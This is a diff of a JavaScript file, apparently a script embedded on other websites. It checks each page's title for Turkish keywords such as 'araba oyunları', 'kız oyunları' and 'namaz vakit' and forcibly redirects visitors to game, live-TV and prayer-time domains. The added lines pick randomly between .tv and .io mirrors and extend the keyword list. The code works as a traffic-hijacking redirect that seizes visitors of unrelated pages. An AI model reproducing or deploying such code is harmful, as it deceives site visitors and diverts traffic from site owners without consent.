@@ -6,13 +6,19 @@ if(document.title.toLowerCase().indexOf("aspor") >= 0){ window.location = "http:
 if(document.title.toLowerCase().indexOf("a spor") >= 0){ window.location = "http://www.canlitvc.com/canli-izle/a-spor/"; } 
 }
 
-if(location.hostname.indexOf("oyunlari.tv") < 0) {
-if(document.title.toLowerCase().indexOf("araba oyunları") >= 0){ window.location = "http://araba.oyunlari.tv/"; }
-}
+var degiskenaraba = ['http://araba.oyunlari.tv/', 'http://araba.oyunlari.io/'];  
+var randaraba = degiskenaraba[Math.floor(Math.random() * degiskenaraba.length)];
+var degiskenkiz = ['http://kiz.oyunlari.tv/', 'http://kiz.oyunlari.io/'];  
+var randkiz = degiskenkiz[Math.floor(Math.random() * degiskenkiz.length)];
 
-if(location.hostname.indexOf("oyunlari.tv") < 0) {
-if(document.title.toLowerCase().indexOf("kız oyunları") >= 0){ window.location = "http://kiz.oyunlari.tv/"; }
-}
+if(location.hostname.indexOf("oyunlari.tv") > 0 || location.hostname.indexOf("oyunlari.io") > 0) {
+}else{if(document.title.toLowerCase().indexOf("araba oyunları") >= 0){ window.location = randaraba; }
+if(document.title.toLowerCase().indexOf("yarış oyunları") >= 0){ window.location = randaraba; }
+if(document.title.toLowerCase().indexOf("kız oyunları") >= 0){ window.location = randkiz; }
+if(document.title.toLowerCase().indexOf("barbie oyunları") >= 0){ window.location = randkiz; }
+if(document.title.toLowerCase().indexOf("makyaj oyunları") >= 0){ window.location = randkiz; }}
+
+
 
 if(location.hostname.indexOf("namazmatik") < 0) {
 if(document.title.toLowerCase().indexOf("namaz vakit") >= 0){ window.location = "http://www.namazmatik.net/"; }
